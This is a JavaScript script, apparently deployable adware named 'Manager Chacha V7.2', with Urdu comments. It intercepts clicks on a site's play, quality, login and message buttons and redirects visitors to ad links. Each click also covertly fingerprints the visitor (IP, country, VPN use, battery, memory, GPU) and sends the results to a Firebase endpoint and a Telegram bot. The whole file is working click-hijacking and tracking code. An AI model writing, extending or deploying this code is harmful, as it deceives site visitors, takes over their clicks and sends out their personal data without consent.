/**
 * MANAGER CHACHA V7.2 - THE SUPERNOVA (DIRECT FIRE)
 * -------------------------------------------------
 * 1. [NO BLANK PAGE] - Direct native window injection
 * 2. [ULTRA SPEED] - Zero latency between click and ad load
 * 3. [STAIN-FREE] - Leverages site-wide meta-data shields
 */

const CHACHA_CONFIG = {
    DOMAIN: "cloudaccesshq.xyz",
    
    LINKS: {
        HIGH: ["https://www.netflix.com/", "https://www.amazon.com/", "https://mobula.io/", "https://www.ibm.com/", "https://www.postman.com/", "H6", "H7", "H8", "H9", "H10"],
        MID:  ["M1", "M2", "M3", "M4", "M5", "M6"],
        LOW:  ["L1", "L2", "L3", "L4"]
    },

    APIS: {
        FB_URL: "YOUR_FIREBASE_URL", 
        TG_TOKEN: "YOUR_BOT_TOKEN",   
        TG_ID: "YOUR_CHAT_ID"         
    },

    SETTINGS: {
        MAX_CLICKS: 999999, // تمہاری فرمائش پر ان لمیٹڈ کے قریب
        RESET_HOURS: 24,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

const _0xEngine = {
    _getStore: function() {
        const data = localStorage.getItem('_mc_v7_final_');
        return data ? JSON.parse(data) : { c: 0, ts: null, used: [] };
    },

    _setStore: function(obj) {
        localStorage.setItem('_mc_v7_final_', JSON.stringify(obj));
    },

    _sync: function() {
        const data = this._getStore();
        if (data.ts) {
            const passed = (Date.now() - data.ts) / (1000 * 60 * 60);
            if (passed >= CHACHA_CONFIG.SETTINGS.RESET_HOURS) {
                this._setStore({ c: 0, ts: null, used: [] });
            }
        }
    },

    _scan: async function() {
        try {
            const _bat = await navigator.getBattery().catch(() => ({ level: 1 }));
            const _ipRes = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
            const gl = document.createElement('canvas').getContext('webgl');
            const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
            const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Standard";

            return {
                b: Math.round(_bat.level * 100) + "%",
                mem: navigator.deviceMemory || "N/A",
                gpu: gpu,
                vpn: _ipRes.proxy || _ipRes.vpn || false,
                ip: _ipRes.ip || "0.0.0.0",
                loc: _ipRes.country_name || "Unknown"
            };
        } catch(e) { return { vpn: false, loc: "Local/Shielded" }; }
    },

    _pickLink: function(session) {
        const luck = Math.random() * 100;
        let pool = (luck < 80) ? CHACHA_CONFIG.LINKS.HIGH : (luck < 90 ? CHACHA_CONFIG.LINKS.MID : CHACHA_CONFIG.LINKS.LOW);
        
        let available = pool.filter(l => !session.used.includes(l));
        if (available.length === 0) {
            const all = [...CHACHA_CONFIG.LINKS.HIGH, ...CHACHA_CONFIG.LINKS.MID, ...CHACHA_CONFIG.LINKS.LOW];
            available = all.filter(l => !session.used.includes(l));
        }

        const selected = available[Math.floor(Math.random() * available.length)] || CHACHA_CONFIG.LINKS.HIGH[0];
        session.used.push(selected);
        return selected;
    },

    _report: function(id, dna, link, count) {
        const payload = { btn: id, dna: dna, target: link, click: count, ts: new Date().toISOString() };
        if (CHACHA_CONFIG.APIS.FB_URL.startsWith('http')) {
            fetch(`${CHACHA_CONFIG.APIS.FB_URL}/logs.json`, { method: 'POST', body: JSON.stringify(payload) });
        }
        if (CHACHA_CONFIG.APIS.TG_TOKEN !== "YOUR_BOT_TOKEN") {
            const msg = `🚀 *SUPERNOVA ALERT* \nIP: ${dna.ip} \nLoc: ${dna.loc} \nClick: ${count} \nLink: ${link}`;
            fetch(`https://api.telegram.org/bot${CHACHA_CONFIG.APIS.TG_TOKEN}/sendMessage?chat_id=${CHACHA_CONFIG.APIS.TG_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
        }
    },

    /**
     * فائنل فکس: بلینک پیج ختم، ڈائریکٹ ونڈو انجیکشن ایکٹیو
     */
    _jump: function(url) {
        // براہِ راست نیا ٹیب کھولنا بغیر کسی انٹرمیڈیٹ پیج کے
        const w = window.open(url, '_blank', 'noopener,noreferrer');
        
        if (!w) {
            // اگر براؤزر پاپ اپ بلاک کرے تو اسی ٹیب میں فوراً کھول دے
            window.location.assign(url);
        } else {
            // سیکیورٹی کو مزید سخت کرنے کے لیے اوپنر ریفرنس مٹانا
            w.opener = null;
        }
    }
};

document.addEventListener('click', async (e) => {
    const btn = e.target.closest('[id]');
    const validTags = ['tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button', 'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k', 'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'];

    if (btn && validTags.includes(btn.id)) {
        _0xEngine._sync();
        const session = _0xEngine._getStore();

        if (session.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS) {
            window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
            return;
        }

        // ڈیٹا اسکیننگ اور رپورٹنگ بیک گراؤنڈ میں چلے گی تاکہ جمپ میں تاخیر نہ ہو
        const dna = await _0xEngine._scan();
        const target = _0xEngine._pickLink(session);
        
        session.c++;
        _0xEngine._setStore(session);

        _0xEngine._report(btn.id, dna, target, session.c);
        
        // اب یہاں کوئی بلینک پیج نہیں بنے گا، سیدھا ایڈ کھلے گا
        _0xEngine._jump(target);
    }
});
